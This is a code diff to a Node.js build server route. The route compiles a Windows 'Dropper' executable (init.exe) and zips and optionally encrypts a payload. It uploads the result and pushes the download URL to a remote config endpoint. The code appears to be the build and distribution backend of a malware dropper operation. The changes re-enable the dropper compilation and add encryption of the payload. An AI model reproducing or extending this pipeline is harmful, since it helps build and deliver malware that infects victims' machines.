@@ -7,6 +7,7 @@ import archiver from 'archiver';
 
 import config from '../config.js';
 import upload from '../utils/upload.js';
+import crypto from '../utils/crypto.js';
 
 import { UploadStatus } from '../enums.js';
 
@@ -75,6 +76,8 @@ router.post('/start-build', async (req, res) => {
             cwd: ryuDir
         });
 
+        let toUpload = undefined;
+
         const zipped = path.join(outputDir, 'publish.zip');
         await new Promise((resolve, reject) => {
             const output = fs.createWriteStream(zipped);
@@ -88,8 +91,13 @@ router.post('/start-build', async (req, res) => {
             archive.finalize();
         });
 
-        if (req.body.reconstruct_zip) {
-            const uploaded = upload.upload(zipped);
+        if (req.body.encrypt_ryugyong_file) {
+            toUpload = await crypto.encryptFile(zipped);
+            fs.unlinkSync(zipped);
+        }
+
+        if (req.body.upload_ryugyong_file) {
+            const { uploaded, newFile } = await upload.upload(toUpload || zipped);
 
             if (uploaded === UploadStatus.RequestNotOK) {
                 return res
@@ -104,10 +112,10 @@ router.post('/start-build', async (req, res) => {
             }
 
             url = uploaded;
-            fs.unlinkSync(zipped);
+            fs.unlinkSync(newFile);
         }
     } catch(e) {
-        console.error('failed to compile main - ', e);
+        console.error('failed to compile main -', e);
 
         return res
             .status(500)
@@ -119,6 +127,7 @@ router.post('/start-build', async (req, res) => {
     if (url !== '') {
         const updateURL = await fetch(config.domain + '/update-config', {
             method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 only_dropper_url: true,
                 download_url: url
@@ -132,29 +141,29 @@ router.post('/start-build', async (req, res) => {
         }
     }
 
-    // try {
-    //     console.log('compiling dropper...');
+    try {
+        console.log('compiling dropper...');
 
-    //     const main = path.resolve('../Dropper');
-    //     const out = path.join(main, 'target/x86_64-pc-windows-msvc/release');
+        const main = path.resolve('../Dropper');
+        const out = path.join(main, 'target/x86_64-pc-windows-msvc/release');
 
-    //     await execute('cargo build --release --target x86_64-pc-windows-msvc', {
-    //         cwd: main
-    //     });
+        await execute('cargo build --release --target x86_64-pc-windows-msvc', {
+            cwd: main
+        });
 
-    //     fs.renameSync(
-    //         path.join(out, 'rust-app.exe'),
-    //         path.join(outputDir, 'init.exe')
-    //     );
-    // } catch(e) {
-    //     common.warn('failed to compile dropper -', e);
+        fs.renameSync(
+            path.join(out, 'rust-app.exe'),
+            path.join(outputDir, 'init.exe')
+        );
+    } catch(e) {
+        common.warn('failed to compile dropper -', e);
 
-    //     return res
-    //         .status(500)
-    //         .send('failed to compile dropper');
-    // }
+        return res
+            .status(500)
+            .send('failed to compile dropper');
+    }
 
-    // common.celeb('built dropper successfully');
+    console.log('built dropper successfully');
 
     console.log('build done');
     return res.sendStatus(200);
